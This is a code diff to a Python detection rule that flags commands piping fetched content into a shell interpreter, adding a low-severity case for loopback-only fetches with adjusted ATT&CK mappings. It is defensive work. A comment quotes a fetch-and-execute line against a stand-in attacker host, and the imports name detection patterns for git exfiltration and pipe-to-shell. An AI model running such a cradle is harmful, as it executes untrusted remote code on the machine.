@@ -33,6 +33,7 @@ from .traits import (
     GIT_EXFIL as _GIT_EXFIL,
     LOOPBACK_IP as _LOOPBACK_IP,
     PIPE_TO_SHELL as _PIPE_TO_SHELL,
+    pipes_only_loopback as _pipes_only_loopback,
     PR_COMMIT_COMMAND as _PR_COMMIT_COMMAND,
     PR_DESC_COMMAND as _PR_DESC_COMMAND,
     PR_MERGE_COMMAND as _PR_MERGE_COMMAND,
@@ -484,13 +485,44 @@ def rule_encoded_command_download(events: list[dict[str, Any]]) -> list[Detectio
             # Piping a fetch into an interpreter is a cradle whatever the host is.
             # Requiring a bare IP let `curl https://evil-cdn.example.com/x.sh | bash`
             # straight through, which is what a real attacker actually uses.
-            piped = bool(_PIPE_TO_SHELL.search(cmd))
+            piped_any = bool(_PIPE_TO_SHELL.search(cmd))
+            piped_local = piped_any and _pipes_only_loopback(cmd)
+            piped = piped_any and not piped_local
             encoded = bool(_ENCODED_CMD.search(cmd))
         else:
             # Default privacy config: no command text — match hook-side labels.
             raw_ip_fetch = _has_trait(event, "raw_ip_fetch")
             piped = _has_trait(event, "pipe_to_shell")
+            piped_local = _has_trait(event, "pipe_to_shell_local")
             encoded = _has_trait(event, "encoded_cmd")
+        if piped_local and not (raw_ip_fetch or piped):
+            # Same shape, no ingress: the fetch never left this host. Recorded
+            # rather than suppressed, because staging a payload on a local port
+            # and then executing it is a real technique, and a rule that goes
+            # silent here would miss it. Low, so it stops drowning the criticals.
+            return [
+                Detection(
+                    rule_id="encoded-command-download",
+                    title="Local content piped into an interpreter",
+                    severity="low",
+                    summary=(
+                        f"{_tool_qualified(event) or 'A command'} piped content from "
+                        "a loopback address into an interpreter"
+                        + (" via an encoded command" if encoded else "")
+                        + ". Nothing crossed the network; noted for completeness."
+                    ),
+                    correlation_id=_correlation_id(events),
+                    # No T1105 and no TA0011. Ingress Tool Transfer and Command
+                    # and Control both mean content arriving from outside;
+                    # claiming either for a loopback fetch would put a false
+                    # ATT&CK mapping in front of an analyst.
+                    tactic_ids=["TA0002"],
+                    technique_ids=["T1059"],
+                    event_ids=[_event_id(event)],
+                    first_seen_utc=_ts(event),
+                    last_seen_utc=_ts(event),
+                )
+            ]
         if raw_ip_fetch or piped:
             techniques = ["T1105", "T1059.001"]  # Ingress Tool Transfer, PowerShell
             if encoded:
